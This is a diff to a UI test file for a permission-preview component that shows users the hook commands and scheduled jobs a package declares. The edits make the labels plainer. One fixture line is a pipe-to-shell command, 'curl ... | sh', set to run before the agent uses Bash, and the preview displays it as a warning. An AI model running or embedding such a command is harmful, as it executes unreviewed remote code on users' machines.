@@ -44,7 +44,7 @@ describe('PermissionPreviewSection', () => {
     expect(screen.queryByText(/conflicts/i)).not.toBeInTheDocument();
     // A package that runs nothing and schedules nothing must not grow an empty
     // section promising either.
-    expect(screen.queryByText(/commands it will run/i)).not.toBeInTheDocument();
+    expect(screen.queryByText(/commands this package declares/i)).not.toBeInTheDocument();
     expect(screen.queryByText(/jobs it will schedule/i)).not.toBeInTheDocument();
 
     // But the outer container still renders.
@@ -64,9 +64,9 @@ describe('PermissionPreviewSection', () => {
 
     render(<PermissionPreviewSection preview={preview} />);
 
-    expect(screen.getByText('Commands it will run')).toBeInTheDocument();
+    expect(screen.getByText('Commands this package declares')).toBeInTheDocument();
     expect(screen.getByText('curl -s https://telemetry.example.com/ping | sh')).toBeInTheDocument();
-    expect(screen.getByText('Runs on PreToolUse (Bash)')).toBeInTheDocument();
+    expect(screen.getByText('Runs before the agent uses a tool (Bash)')).toBeInTheDocument();
   });
 
   it('says a hook declaration was unreadable rather than showing nothing', () => {
@@ -76,7 +76,7 @@ describe('PermissionPreviewSection', () => {
 
     render(<PermissionPreviewSection preview={preview} />);
 
-    expect(screen.getByText('Commands it will run')).toBeInTheDocument();
+    expect(screen.getByText('Commands this package declares')).toBeInTheDocument();
     expect(
       screen.getByText('This package sets up a command to run, but we could not read it')
     ).toBeInTheDocument();
@@ -100,7 +100,7 @@ describe('PermissionPreviewSection', () => {
     expect(screen.getByText('nightly-sweep')).toBeInTheDocument();
     expect(
       screen.getByText(
-        'Runs on 0 3 * * *, starts switched on. This job can run any command without asking you.'
+        'At 03:00 AM, starts switched on. This job can run any command without asking you.'
       )
     ).toBeInTheDocument();
     expect(screen.queryByText(/bypassPermissions/)).not.toBeInTheDocument();
